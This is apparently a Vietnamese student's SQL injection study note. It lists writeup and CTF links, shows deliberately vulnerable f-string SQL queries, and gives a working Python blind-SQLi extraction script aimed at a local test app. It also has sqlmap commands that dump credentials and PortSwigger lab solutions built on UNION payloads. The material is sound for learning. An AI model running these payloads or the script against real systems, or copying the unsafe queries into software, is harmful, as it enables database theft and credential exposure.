# Tuần 2 về SQL Injection

# Mục tiêu 

- [1. Tìm đọc và thống kê lại  writeup về khai thác lỗ hổng SQL Injection](#1-tìm-đọc-và-thống-kê-lại--writeup-về-khai-thác-lỗ-hổng-sql-injection)

- [2. Thực hiện khai thác lỗ hổng SQLi](#2-thực-hiện-khai-thác-lỗ-hổng-sqli)

    - [2.1 Khai thác bằng viết Python Code](#21-khai-thác-bằng-viết-python-code)

    - [2.2 Khai thác bằng tool SQLMap](#22-khai-thác-bằng-tool-sqlmap)

- [3. Vượt qua các challenge SQLi](#3-vượt-qua-các-challenge-sqli)


# 1. Tìm đọc và thống kê lại  writeup về khai thác lỗ hổng SQL Injection

### 1.1 Lỗ hổng SQLi của các công ty lớn

##### **Apple**

1. [Apple Developer talks about Avoiding injection attacks and XSS](https://developer.apple.com/library/archive/documentation/Security/Conceptual/SecureCodingGuide/Articles/BufferOverflows.html#//apple_ref/doc/uid/TP40002577-SW1)
2. [Community Apple](https://discussions.apple.com/thread/7649301?utm_source=chatgpt.com&sortBy=rank)
3. [Kaspersky Pro Guide](https://kaspersky.proguide.vn/bao-mat-cong-nghe/day-la-55-lo-hong-nghiem-trong-trong-phan-mem-va-dich-vu-apple/?srsltid=AfmBOoqApRmVkan2NQMqQq2-TX6U2DgCk9pnKpeHSmtFfDfi8eH106Ak&utm_source=chatgpt.com)

##### **Facebook**

1. [Acunetix](https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-wordpress-facebook-sql-injection-1-0-8/?utm_source=chatgpt.com)
2. [Facebook](https://www.facebook.com/groups/bugineverything/posts/656240909622218/?utm_source=chatgpt.com)
3. [GitHub](https://github.com/corrupted-brain/Facebook-Bug-Bounty-Writeups?utm_source=chatgpt.com)

##### **Microsoft**

1. [Học Microsoft](https://learn.microsoft.com/en-us/sql/relational-databases/security/sql-injection?view=sql-server-ver16&utm_source=chatgpt.com)
2. [Microsoft Security Response Center](https://msrc.microsoft.com/blog/2008/05/sql-injection-attack/?utm_source=chatgpt.com)
3. [Cộng đồng Công nghệ Microsoft](https://techcommunity.microsoft.com/blog/azuredbsupport/sql-injection-example-of-sql-injections-and-recommendations-to-avoid-it-/3055388?utm_source=chatgpt.com)
4. [Invicti](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/?utm_source=chatgpt.com)
5. [Học Microsoft](https://learn.microsoft.com/en-us/answers/questions/1328426/sql-injection-vulnerability?cid=kerryherger&utm_source=chatgpt.com)

### 1.2 Các cuộc thi CTF

1. [Fare Evasion](https://ctftime.org/task/28645) by [Ireland without the RE](https://ctftime.org/team/179144)
2. [Ticket API](https://ctftime.org/task/27871) by [sillysec](https://ctftime.org/team/268440)
3. [la housing portal](https://ctftime.org/task/27671) by [P01s0n3d_Fl4g](https://ctftime.org/team/273774)
4. [funnylogin](https://ctftime.org/task/27553) by [Genocybers](https://ctftime.org/team/278438)
5. [What's My Password?](https://ctftime.org/task/27407) by [NoobMaster9999_team](https://ctftime.org/team/223753)
6. [Fluxx](https://ctftime.org/task/27510) by [~T2T~](https://ctftime.org/team/279042)
7. [Gain Access 1](https://ctftime.org/task/27499) by [P01s0n3d_Fl4g](https://ctftime.org/team/273774)
8. [Kitty](https://ctftime.org/task/27491) by [P01s0n3d_Fl4g](https://ctftime.org/team/273774)
9. [Bug Report Repo](https://ctftime.org/task/27097) by [Intigriti](https://ctftime.org/team/178083)
10. [ezmaria](https://ctftime.org/task/26758) by [bawolff](https://ctftime.org/team/154529)
11. [Cybergon's Blog](https://ctftime.org/task/26136) by [K3RN3L4RMY](https://ctftime.org/team/142217)
12. [Cat Viewer](https://ctftime.org/task/26067) by [bdhxgrp](https://ctftime.org/team/193805)
13. [login](https://ctftime.org/task/25980) by [flag_bot](https://ctftime.org/team/220424)
14. [blank](https://ctftime.org/task/25979) by [touch grass](https://ctftime.org/team/251835)
15. [VolgaCTF 2023 - 1337 Web Challenge](https://ctftime.org/task/25204) by [L3ak](https://ctftime.org/team/220336)
16. [Orbital](https://ctftime.org/task/24646) by [BlackOps](https://ctftime.org/team/81573)
17. [Orbital](https://ctftime.org/task/24646) by [BadWolf](https://ctftime.org/team/23804)
18. [web/Guess The Pokemon](https://ctftime.org/task/23023) by [casework bash](https://ctftime.org/team/195167)
19. [Super Secure](https://ctftime.org/task/21016) by [R00t3xpl0it3r](https://ctftime.org/team/189644)
20. [Super Secure](https://ctftime.org/task/21016) by [B45710N_R351L13NC3](https://ctftime.org/team/181077)
21. [Flaskmetal Alchemist](https://ctftime.org/task/20828) by [meraxes](https://ctftime.org/team/129011)
22. [Flaskmetal Alchemist](https://ctftime.org/task/20828) by [origineel](https://ctftime.org/team/89781)
23. [My Useless Website](https://ctftime.org/task/19478) by [F0x2C](https://ctftime.org/team/107232)
24. [My Useless Websigte](https://ctftime.org/task/19504) by [RanGo007](https://ctftime.org/team/178925)
25. [no-cookies](https://ctftime.org/task/18858) by [bawolff](https://ctftime.org/team/154529)
26. [Hack into Skynet](https://ctftime.org/task/18699) by [Scrypter](https://ctftime.org/team/31353)
27. [Hack into Skynet](https://ctftime.org/task/18699) by [m17m0](https://ctftime.org/team/167004)
28. [shitty blog](https://ctftime.org/task/18484) by [scriptohio](https://ctftime.org/team/144581)
29. [Yummy Vegetables](https://ctftime.org/task/18331) by [PwnProphecy](https://ctftime.org/team/158049)
30. [Toy Management](https://ctftime.org/task/18289) by [LazyTitan](https://ctftime.org/team/162510)
31. [Toy Management](https://ctftime.org/task/18289) by [rawsec](https://ctftime.org/team/27232)
32. [GoodGames](https://ctftime.org/task/18126) by [Radboud Institute of Pwning](https://ctftime.org/team/128996)
33. [My Vulnerability Portal](https://ctftime.org/task/17761) by [1nf1n1ty](https://ctftime.org/team/151859)
34. [Chasing The Flag!](https://ctftime.org/task/17287) by [sadman rafin](https://ctftime.org/team/96044)
35. [Vuln Drive](https://ctftime.org/task/16952) by [bi0s](https://ctftime.org/team/662)
36. [secure](https://ctftime.org/task/16454) by [Fweefwop](https://ctftime.org/team/88161)
37. [orm-bad](https://ctftime.org/task/16447) by [FishBowl](https://ctftime.org/team/154511)
38. [Phish](https://ctftime.org/task/16381) by [icypete](https://ctftime.org/team/154080)
39. [big-blind](https://ctftime.org/task/16355) by [CTF.SG](https://ctftime.org/team/77768)
40. [API 2 : The SeQueL](https://ctftime.org/task/15810) by [Javantea](https://ctftime.org/team/154083)
41. [Get Me](https://ctftime.org/task/15664) by [meraxes](https://ctftime.org/team/129011)
42. [Art Gallery 2](https://ctftime.org/task/15253) by [TheGoonies](https://ctftime.org/team/10288)
43. [DarkCON Challs](https://ctftime.org/task/15051) by [BullSoc](https://ctftime.org/team/80532)
44. [Baby SQLi](https://ctftime.org/task/14839) by [ARESx](https://ctftime.org/team/128734)
45. [maze](https://ctftime.org/task/14610) by [LuftensHjaltar](https://ctftime.org/team/50600)
46. [Password Extraction](https://ctftime.org/task/10887) by [noraneco](https://ctftime.org/team/12750)
47. [The after-Prequal](https://ctftime.org/task/10800) by [2bits](https://ctftime.org/team/114074)
48. [Secure System](https://ctftime.org/task/10272) by [justCatTheFish](https://ctftime.org/team/33893)
49. [Sequel Fun](https://ctftime.org/task/9987) by [4katsuk1](https://ctftime.org/team/63383)
50. [Mission Control](https://ctftime.org/task/9476) by [noobintheshell](https://ctftime.org/team/70917)
51. [SQL Injected](https://ctftime.org/task/7861) by [zuzzur3ll0n1](https://ctftime.org/team/65068)
52. [SQL](https://ctftime.org/task/7704) by [noobintheshell](https://ctftime.org/team/70917)
53. [Not Another SQLi Challenge](https://ctftime.org/task/7716) by [ayyy](https://ctftime.org/team/25836)
54. [Maria](https://ctftime.org/task/7629) by [rawsec](https://ctftime.org/team/27232)
55. [Old School SQL](https://ctftime.org/task/6917) by [PwnaSonic](https://ctftime.org/team/21256)
56. [who knows john dows?](https://ctftime.org/task/6720) by [EmpireCTF](https://ctftime.org/team/57176)
57. [Image Share Box](https://ctftime.org/task/6313) by [Lorem Checksum](https://ctftime.org/team/53545)
58. [SQL Sanity Check](https://ctftime.org/task/6192) by [k3rn3l_p4n1c](https://ctftime.org/team/57760)
59. [sql](https://ctftime.org/task/5390) by [greunion](https://ctftime.org/team/29976)
60. [Management](https://ctftime.org/task/5016) by [TeamRocketIst](https://ctftime.org/team/27504)
61. [THE-WALL](https://ctftime.org/task/4683) by [Sudo_root](https://ctftime.org/team/16812)
62. [Naughty ads](https://ctftime.org/task/4612) by [rawsec](https://ctftime.org/team/27232)
63. [simplesqlin](https://ctftime.org/task/3632) by [_PRIME_](https://ctftime.org/team/32187)
64. [Divide and rule](https://ctftime.org/task/3779) by [bi0s](https://ctftime.org/team/662)
65. [Bloody Feedback](https://ctftime.org/task/3696) by [BE4HOXVII](https://ctftime.org/team/34480)
66. [Shobot](https://ctftime.org/task/3309) by [kepler](https://ctftime.org/team/31331)
67. [Super duper advanced attack](https://ctftime.org/task/2994) by [Burlingpwn](https://ctftime.org/team/22541)
68. [weebdate](https://ctftime.org/task/1646) by [TheGoonies](https://ctftime.org/team/10288)
69. [PolygonShifter](https://ctftime.org/task/1099) by [!SpamAndHex](https://ctftime.org/team/5347)
70. [Login as admin!](https://ctftime.org/task/1617) by [bi0s](https://ctftime.org/team/662)
71. [game-leaderboard](https://ctftime.org/task/21319) by [alright21](https://ctftime.org/team/186776)
72. [Sea of Quills](https://ctftime.org/task/15324) by [wetox](https://ctftime.org/team/107190)
73. [yhsj](https://ctftime.org/task/39) by [Big-Daddy](https://ctftime.org/team/310)
74. [QRb00k - Russia](https://ctftime.org/task/2877) by [atx2600](https://ctftime.org/team/15170)
75. [URL Anonymizer](https://ctftime.org/task/2833) by [InfoSecIITR](https://ctftime.org/team/16691)
76. [ChainedIn](https://ctftime.org/task/2665) by [318br](https://ctftime.org/team/24500)
77. [Illuminati](https://ctftime.org/task/2651) by [p4](https://ctftime.org/team/5152)
78. [Homework](https://ctftime.org/task/2488) by [RingZer0Team](https://ctftime.org/team/27117)
79. [weebdate](https://ctftime.org/task/1646) by [TheGoonies](https://ctftime.org/team/10288)
80. [Web300 Blind](https://ctftime.org/task/984) by [SIGINT](https://ctftime.org/team/6473)
81. [Are you brave enough?](https://ctftime.org/task/4708) by [sw1ss](https://ctftime.org/team/40222) 
82. [Naughty ads](https://ctftime.org/task/4612) by [PwnaSonic](https://ctftime.org/team/21256)
83. [Br0kenMySQL3](https://ctftime.org/task/4318) by [FluxFingers](https://ctftime.org/team/551)
84. [shooter](https://ctftime.org/task/6933) by [noraneco](https://ctftime.org/team/12750)
85. [Tet shopping](https://ctftime.org/task/5207) by [OpenToAll](https://ctftime.org/team/9135)
86. [Sokosoko Secure Uploader](https://ctftime.org/task/5288) by [PwnaSonic](https://ctftime.org/team/21256) 
87. [77777 2](https://ctftime.org/task/5499) by [HackTA](https://ctftime.org/team/53464)
88. [shooter](https://ctftime.org/task/6933) by [PDKT](https://ctftime.org/team/16919)
89. [Special Force](https://ctftime.org/task/7075) by [sw1ss](https://ctftime.org/team/40222)
90. [Colonel Mustard's Simple Signin](https://ctftime.org/task/7112) by [f14](https://ctftime.org/team/70242)

# 2. Thực hiện khai thác lỗ hổng SQLi

Đây là một số lỗi SQL injection có trong code của tôi

**Lỗi 1 :**
```js
query = f"SELECT * FROM students WHERE username = '{username}' AND password = '{password}'"  
cursor.execute(query)  
student = cursor.fetchone()
```

**Lỗi 2:**
```js
cursor.execute(f"SELECT * FROM students WHERE id = '{student_id}'")  
student = cursor.fetchone()
```

### 2.1 Khai thác bằng viết Python Code

Chúng ta có thể dùng python code để khai thác lỗi bằng cách sử dụng thư viên `requests` để tạo ra các request HTTP đến trang web mà chúng ta muốn khai thác 

##### 1.Thư viện
```js
import requests
import json

# URL mục tiêu
base_url = "http://127.0.0.1:5000/teacher_dashboard?id=1"
```

- Đầu tiên, ta dùng các thư viện cần thiết: `requests` để gửi các yêu cầu HTTP và `json` để xử lý dữ liệu JSON.
- `base_url` là địa chỉ API mà bạn muốn gửi yêu cầu đến. Trong trường hợp này, đó là URL giả định `http://127.0.0.1:5000/teacher_dashboard?id=1`.
##### 2.Hàm `send_payload`
```js
def send_payload(payload):
    """Gửi payload và kiểm tra phản hồi."""
    url_with_payload = base_url + payload
    try:
        response = requests.get(url_with_payload)
        print(f"Response Code: {response.status_code}")  # Thêm dòng này để kiểm tra mã phản hồi
        if response.status_code == 200:
            return True
        return False
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")  # In lỗi nếu có sự cố khi gửi yêu cầu
        return False
```

- Hàm này nhận vào một `payload`, tạo URL hoàn chỉnh, và gửi yêu cầu GET tới URL đó.
- Sau khi gửi yêu cầu, hàm kiểm tra mã phản hồi HTTP. Nếu mã là 200 (thành công), trả về `True`, ngược lại trả về `False`.
- Nếu có lỗi trong quá trình gửi yêu cầu (ví dụ: không thể kết nối), hàm sẽ in ra lỗi và trả về `False`.

##### 3.Hàm `extract_binary_search`

```js
def extract_binary_search(base_payload, low, high):
    """Tìm kiếm nhị phân để trích xuất thông tin."""
    while low <= high:
        mid = (low + high) // 2
        payload = base_payload.format(operator="=", value=mid)
        if send_payload(payload):
            return mid
        payload = base_payload.format(operator=">", value=mid)
        if send_payload(payload):
            low = mid + 1
        else:
            high = mid - 1
    return None
```

- Hàm này thực hiện tìm kiếm nhị phân trên một dãy số (được xác định bởi `low` và `high`) để trích xuất thông tin.
- Hàm sử dụng `send_payload()` để thử với các giá trị trung gian (`mid`) và điều chỉnh phạm vi tìm kiếm dựa trên kết quả trả về.
- Nếu tìm thấy giá trị hợp lệ, hàm trả về giá trị đó, nếu không sẽ tiếp tục điều chỉnh phạm vi.


##### 4.Hàm `get_string_length`
```js
def get_string_length(base_payload):
    """Lấy chiều dài chuỗi."""
    length = 1
    max_length = 100  # Giới hạn số lần thử để tránh vòng lặp vô tận
    while length <= max_length:
        payload = base_payload.format(length=length)
        if send_payload(payload):
            return length
        length += 1
    return None  # Trả về None nếu không tìm thấy chiều dài hợp lệ
```

- Hàm này tìm chiều dài của chuỗi bằng cách thử từng giá trị `length` từ 1 đến 100.
- Nếu gửi payload thành công (tức là độ dài chuỗi hợp lệ), hàm trả về giá trị chiều dài. Nếu không tìm thấy chiều dài hợp lệ trong phạm vi thử nghiệm, trả về `None`

##### 5.Hàm `get_string_content`
```js
def get_string_content(base_payload, length):
    """Trích xuất nội dung chuỗi."""
    result = ""
    for position in range(1, length + 1):
        # Sử dụng format để truyền vị trí hiện tại vào payload
        payload = base_payload.format(position=position, operator="{operator}", value="{value}")
        char_ascii = extract_binary_search(payload, 32, 126)
        if char_ascii:
            result += chr(char_ascii)
    return result
```

- Hàm này trích xuất từng ký tự của chuỗi từ cơ sở dữ liệu bằng cách sử dụng tìm kiếm nhị phân.
- Nó thực hiện tìm kiếm cho từng vị trí trong chuỗi (từ 1 đến `length`), và dùng `extract_binary_search()` để tìm giá trị ASCII của ký tự tại mỗi vị trí.

##### 6.Hàm `get_database_names`
```js
def get_database_names():
    """Lấy danh sách databases."""
    databases = []
    index = 1
    while True:
        # Lấy chiều dài của database name
        base_payload = (
            f"' AND LENGTH((SELECT schema_name FROM information_schema.schemata LIMIT {index - 1}, 1)) = {{length}}--+-"
        )
        length = get_string_length(base_payload)
        if not length:
            break
        # Lấy nội dung của database name
        base_payload_content = (
            f"' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT {index - 1}, 1), {{position}}, 1)) {{operator}} {{value}}--+-"
        )
        db_name = get_string_content(base_payload_content, length)
        databases.append(db_name)
        index += 1
    return databases
```

- Hàm này lấy danh sách các cơ sở dữ liệu (`databases`) bằng cách sử dụng SQL injection. Nó thực hiện tìm kiếm chuỗi tên các database từ bảng `information_schema.schemata`.
- Mỗi lần thử, hàm tìm chiều dài và nội dung của một tên cơ sở dữ liệu, sau đó thêm vào danh sách `databases`.

**Kết quả DATABASE:**
![Screenshot 2025-05-27 144449](https://github.com/user-attachments/assets/32662a27-a001-448f-b8c8-3e836fa1a6aa)

##### 7.Hàm `get_tables`

Lấy ra các bảng trong Database mà người dùng vừa chọn
```js
def get_tables(database):  
    """Lấy danh sách tables của một database."""  
    tables = []  
    index = 1  
    while True:  
        base_payload = (  
            f"' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT {index - 1}, 1)) = {{length}}--+-"  
        )  
        length = get_string_length(base_payload)  
        if not length:  
            break  
        base_payload_content = (  
            f"' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT {index - 1}, 1), {{position}}, 1)) {{operator}} {{value}}--+-"  
        )  
        table_name = get_string_content(base_payload_content, length)  
        tables.append(table_name)  
        index += 1  
    return tables
```

**Kết quả TABLES:**
![Screenshot 2025-05-27 144524](https://github.com/user-attachments/assets/9af5e4c5-e879-41c2-af89-8956518f8b61)


##### 8.Hàm  `get_columns`

Lấy ra các cột có trong bảng vừa chọn
```js
def get_columns(table, database, selected_columns=None):  
    """Lấy danh sách columns của một table, chỉ lấy những cột người dùng muốn."""  
    columns = []  
    if selected_columns:  
        # Nếu người dùng nhập vào cột, chỉ lấy các cột đó  
        columns = selected_columns  
    else:  
        # Nếu không nhập, lấy tất cả các cột  
        index = 1  
        while True:  
            base_payload = (  
                f"' AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{database}' LIMIT {index - 1}, 1)) = {{length}}--+-"  
            )  
            length = get_string_length(base_payload)  
            if not length:  
                break  
            base_payload_content = (  
                f"' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{database}' LIMIT {index - 1}, 1), {{position}}, 1)) {{operator}} {{value}}--+-"  
            )  
            column_name = get_string_content(base_payload_content, length)  
            columns.append(column_name)  
            index += 1  
    return columns
```

**Kết quả COLUMNS:**
![Screenshot 2025-05-27 144549](https://github.com/user-attachments/assets/d5c0602b-fea8-42f4-89fc-575166b0fc12)


##### 9.Hàm `get_data_from_table`

Lấy ra các giá trị có trong tường cột

```js
def get_data_from_table(table, selected_columns, database):  
    """Lấy dữ liệu từ một table, chỉ lấy dữ liệu của các cột người dùng yêu cầu."""  
    data = []  
    index = 1  
    while True:  
        row = {}  
        for column in selected_columns:  
            base_payload = (  
                f"' AND LENGTH((SELECT {column} FROM {database}.{table} LIMIT {index - 1}, 1)) = {{length}}--+-"  
            )  
            length = get_string_length(base_payload)  
            if not length:  
                return data  
            base_payload_content = (  
                f"' AND ASCII(SUBSTRING((SELECT {column} FROM {database}.{table} LIMIT {index - 1}, 1), {{position}}, 1)) {{operator}} {{value}}--+-"  
            )  
            value = get_string_content(base_payload_content, length)  
            row[column] = value  
        data.append(row)  
        index += 1  
    return data
```

**Kết quả VALUE:**
![Screenshot 2025-05-27 144618](https://github.com/user-attachments/assets/51e6df22-e312-4e88-99ad-96379b18eb3e)


##### 8.Giao diện người dùng
```js
# Lấy danh sách databases
databases = get_database_names()
print("Danh sách databases:", json.dumps(databases, indent=4))

# Chọn database
database = input("Nhập tên database: ")

# Lấy danh sách tables
tables = get_tables(database)
print("Danh sách tables:", json.dumps(tables, indent=4))

# Chọn table
table = input("Nhập tên table: ")

# Lấy danh sách columns
columns = get_columns(table, database)
print("Danh sách columns:", json.dumps(columns, indent=4))

# Lấy dữ liệu từ table
data = get_data_from_table(table, columns, database)
print("Dữ liệu từ table:", json.dumps(data, indent=4))
```

Cuối cùng, chương trình sử dụng các hàm trên để lấy thông tin từ cơ sở dữ liệu. Nó in danh sách các cơ sở dữ liệu, bảng, cột và dữ liệu từ bảng đã chọn.

### 2.2 Khai thác bằng tool SQLMap

##### 1. SQLMap là gì?

**SQLMap** là một công cụ mã nguồn mở mạnh mẽ, được viết bằng Python, dùng để tự động phát hiện và khai thác các lỗ hổng **SQL Injection** trên các ứng dụng web. Nó hỗ trợ nhiều loại cơ sở dữ liệu như MySQL, PostgreSQL, Microsoft SQL Server, Oracle, SQLite, DB2, MariaDB, và nhiều hệ quản trị cơ sở dữ liệu khác.

SQLMap cung cấp nhiều tính năng, bao gồm:

1. **Phát hiện lỗ hổng SQL Injection tự động**.
2. **Khai thác lỗ hổng** để:
    - Liệt kê cơ sở dữ liệu, bảng, và cột.
    - Lấy dữ liệu nhạy cảm như tên người dùng và mật khẩu.
    - Chèn shell hoặc thực thi các lệnh hệ thống từ xa.
3. **Hỗ trợ nhiều loại SQL Injection**, như:
    - Blind SQL Injection.
    - Union-based SQL Injection.
    - Error-based SQL Injection.
    - Time-based SQL Injection.
    - Out-of-band SQL Injection.

##### 2.Điều kiện để tấn công bằng SQLMap

1. **Mục tiêu phải có lỗ hổng SQL Injection**

- Ứng dụng web phải chứa lỗ hổng SQL Injection ở đầu vào dữ liệu, ví dụ:
    - Tham số URL (`?id=1`).
    - Biểu mẫu nhập liệu (Form Input).
    - Header HTTP (User-Agent, Referer, Cookie).
- SQLMap sẽ thử nghiệm và phát hiện các lỗ hổng này.

 2. **Kẻ tấn công phải có quyền truy cập vào ứng dụng web**

- Phải có khả năng gửi yêu cầu HTTP đến máy chủ (trực tiếp hoặc thông qua proxy).

 3. **Hiểu biết cơ bản về mục tiêu**

- Xác định các tham số đầu vào có thể bị khai thác, ví dụ:

```js
http://example.com/page.php?id=1
```

- Phải biết endpoint hoặc URL chứa tham số khả nghi.

4. **Không có cơ chế bảo vệ mạnh mẽ**

- Nếu ứng dụng sử dụng các biện pháp bảo vệ như:
    - **Prepared Statements** hoặc **Parameterized Queries**.
    - **WAF (Web Application Firewall)** hoặc **IDS/IPS**.
    - **Sanitization** và kiểm tra đầu vào nghiêm ngặt.
- Việc khai thác bằng SQLMap sẽ rất khó khăn hoặc không thể thực hiện.

##### 3.Thực hành 

Thực hành với sqlmap có sẵn ở trên máy, nếu không có hãy cài đặt và giải nén qua đường link này : [[https://github.com/sqlmapproject/sqlmap]]

**Bước 1:** Vào Terminal và hướng thư mục đến file sqlmap đã được giải nén

**Bước 2:** Thực hiện câu lệnh để Liệt kê tất cả các **Database** của hệ thống
```js
python sqlmap.py -u "http://127.0.0.1:5000/search?id=1" --dbs
```
![Screenshot 2025-05-27 144646](https://github.com/user-attachments/assets/5e68d8df-441e-4dae-affc-7b6d72af86ed)


**Bước 3:** Thực hiện câu lệnh để liệt kê tất cả các **Tables** của cơ sở dữ liệu mà bạn chọn
```js
python sqlmap.py -u "http://127.0.0.1:5000/search?id=1" -D luutru_thongtin --tables
```

![Screenshot 2025-05-27 144711](https://github.com/user-attachments/assets/47a13e90-2e76-4aa3-8cde-5db2ee26be1e)


**Bước 4:** Thực hiện câu lệnh để liệt kê tất cả các **Colums** của bảng mà bạn chọn
```js
python sqlmap.py -u "http://127.0.0.1:5000/search?id=1" -D luutru_thongtin -T teachers --columns
```

![Screenshot 2025-05-27 144733](https://github.com/user-attachments/assets/926c7750-3aed-474e-9907-22353b742e5f)


**Bước 5:** Thực hiện câu lệnh để lấy ra các giá trị trong từng cột mà bạn muốn
```js
python sqlmap.py -u "http://127.0.0.1:5000/search?id=1" -D luutru_thongtin -T teachers -C id,username,password --dump
```

**Kết quả** sẽ trả về tài khoản và mật khẩu được lưu trong cơ sở dữ liệu 

![Screenshot 2025-05-27 144756](https://github.com/user-attachments/assets/ae2aaa33-dc85-4df4-bcf6-9efc0079072b)

# 3. Vượt qua các challenge SQLi

### 3.1 Challenge trên portswigger
#### 1. Challenge 1

![Screenshot 2025-05-27 144835](https://github.com/user-attachments/assets/37d62e21-510c-4e4e-8e68-68794af45ba5)

**Giải pháp**
1. Sửa đổi `category`tham số, cung cấp cho nó giá trị`'+OR+1=1--`
2. Gửi yêu cầu và xác minh rằng phản hồi hiện có chứa một hoặc nhiều sản phẩm chưa phát hành.

Kết quả :

![Screenshot 2025-05-27 144914](https://github.com/user-attachments/assets/c9a63264-b3f6-4c38-9f8b-246d2d9a772d)

##### 2.Challenge 2

![Screenshot 2025-05-27 145047](https://github.com/user-attachments/assets/aa6ef6c1-9a5c-48b2-a4c2-47532a4d18af)

**Giải pháp**
1. Sửa đổi `username`tham số bằng cách gán giá trị cho nó:`administrator'--`

![Screenshot 2025-05-27 145110](https://github.com/user-attachments/assets/9eaa07c3-f443-4f62-8a6e-4436b642a432)

##### 3. Challenge 3

![Screenshot 2025-05-27 145129](https://github.com/user-attachments/assets/17c1ea40-82b6-4d92-8f79-43266dcd4bce)

**Giải pháp**

1. Sửa đổi `category`tham số, gán cho nó giá trị `'+UNION+SELECT+NULL--`. Quan sát thấy lỗi xảy ra.
2. Sửa đổi `category`tham số để thêm một cột bổ sung chứa giá trị null:
    `'+UNION+SELECT+NULL,NULL--`
3. Tiếp tục thêm giá trị null cho đến khi lỗi biến mất và phản hồi bao gồm nội dung bổ sung có chứa giá trị null.


Nếu kiếm tra có lỗi `500` này thì tiếp tục tăng thêm NULL
![Screenshot 2025-05-27 145201](https://github.com/user-attachments/assets/bb61571f-d313-4f96-a1ca-764cc4bbe976)

Kết quả ra `200` thì đã thành công 

![Screenshot 2025-05-27 145219](https://github.com/user-attachments/assets/82208459-537e-40d2-ab97-a2a832fc001f)

##### 4. Challenge 4

![Screenshot 2025-05-27 145239](https://github.com/user-attachments/assets/b97a3021-f816-4bd7-aebe-ba0664e521fb)

**Giải pháp**

1. Sử dụng Burp Suite để chặn và sửa đổi yêu cầu thiết lập bộ lọc danh mục sản phẩm.
2. Xác định số cột được truy vấn trả về. Xác minh rằng truy vấn trả về ba cột, sử dụng tải trọng sau trong `category`tham số:
    
    `'+UNION+SELECT+NULL,NULL,NULL--`
3. Hãy thử thay thế mỗi giá trị null bằng giá trị ngẫu nhiên do phòng thí nghiệm cung cấp, ví dụ:
    
    `'+UNION+SELECT+'abcdef',NULL,NULL--`
4. Nếu xảy ra lỗi, hãy chuyển sang giá trị null tiếp theo và thử giá trị đó.

![Screenshot 2025-05-27 145302](https://github.com/user-attachments/assets/8e1acee0-6c58-4708-ab16-975fef61e989)


##### 5. Challenge 5

![Screenshot 2025-05-27 145319](https://github.com/user-attachments/assets/b151fc5f-92eb-4d80-847a-fb44d0866a18)

**Giải pháp**
1. Sử dụng Burp Suite để chặn và sửa đổi yêu cầu thiết lập bộ lọc danh mục sản phẩm.
2. Xác định số cột được truy vấn trả về và những cột nào chứa dữ liệu văn bản. Xác minh rằng truy vấn trả về hai cột, cả hai đều chứa văn bản, bằng cách sử dụng tải trọng như sau trong tham số danh mục:
    
    `'+UNION+SELECT+'abc','def'--`
3. Sử dụng tải trọng sau để lấy nội dung của `users`bảng:
    
    `'+UNION+SELECT+username,+password+FROM+users--`
4. Xác minh rằng phản hồi của ứng dụng có chứa tên người dùng và mật khẩu.

![Screenshot 2025-05-27 145339](https://github.com/user-attachments/assets/b21cc1bf-dc65-4a11-a8bc-852d83e254ea)

##### 6. Challenge 6

![Screenshot 2025-05-27 145404](https://github.com/user-attachments/assets/22248911-a103-4d89-a2c5-863cb538f25c)

**Giải pháp**
1. Sử dụng Burp Suite để chặn và sửa đổi yêu cầu thiết lập bộ lọc danh mục sản phẩm.
2. Xác định số cột được truy vấn trả về và những cột nào chứa dữ liệu văn bản. Xác minh rằng truy vấn trả về hai cột, trong đó chỉ có một cột chứa văn bản, bằng cách sử dụng tải trọng như sau trong `category`tham số:
    
    `'+UNION+SELECT+NULL,'abc'--`
3. Sử dụng tải trọng sau để lấy nội dung của `users`bảng:
    
    `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
4. Xác minh rằng phản hồi của ứng dụng có chứa tên người dùng và mật khẩu.

![Screenshot 2025-05-27 145430](https://github.com/user-attachments/assets/9e2a6de4-eb8b-4f9c-8839-467fecbce88e)

##### 7. Challenge 7

![Screenshot 2025-05-27 145449](https://github.com/user-attachments/assets/0fb53138-f5c2-431c-97d4-da36d9e644d8)

**Giải pháp**
1. Sử dụng Burp Suite để chặn và sửa đổi yêu cầu thiết lập bộ lọc danh mục sản phẩm.
2. Xác định số cột được truy vấn trả về và những cột nào chứa dữ liệu văn bản. Xác minh rằng truy vấn trả về hai cột, cả hai đều chứa văn bản, bằng cách sử dụng tải trọng như sau trong tham `category`số:
    
    `'+UNION+SELECT+'abc','def'#`
3. Sử dụng đoạn mã sau để hiển thị phiên bản cơ sở dữ liệu:
    
    `'+UNION+SELECT+@@version,+NULL#`

![Screenshot 2025-05-27 145547](https://github.com/user-attachments/assets/375c0b97-d58e-433e-b5a0-18b49d3723a3)

##### 8. Challenge 8

![Screenshot 2025-05-27 145616](https://github.com/user-attachments/assets/7bb9adaa-531f-4d9b-bf34-c9c420c1c435)

**Giải pháp**
1. Sử dụng Burp Suite để chặn và sửa đổi yêu cầu thiết lập bộ lọc danh mục sản phẩm.
2. Xác định số cột được truy vấn trả về và những cột nào chứa dữ liệu văn bản. Xác minh rằng truy vấn trả về hai cột, cả hai đều chứa văn bản, bằng cách sử dụng tải trọng như sau trong tham `category`số:
    
    `'+UNION+SELECT+'abc','def'--`
3. Sử dụng lệnh sau để lấy danh sách các bảng trong cơ sở dữ liệu:
    `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
4. Tìm tên của bảng chứa thông tin đăng nhập của người dùng.
5. Sử dụng lệnh sau (thay thế tên bảng) để lấy thông tin chi tiết về các cột trong bảng:
    `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
6. Tìm tên các cột chứa tên người dùng và mật khẩu.
7. Sử dụng đoạn mã sau (thay thế tên bảng và tên cột) để lấy tên người dùng và mật khẩu của tất cả người dùng:
    `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`
8. Tìm mật khẩu của `administrator`người dùng và sử dụng nó để đăng nhập.

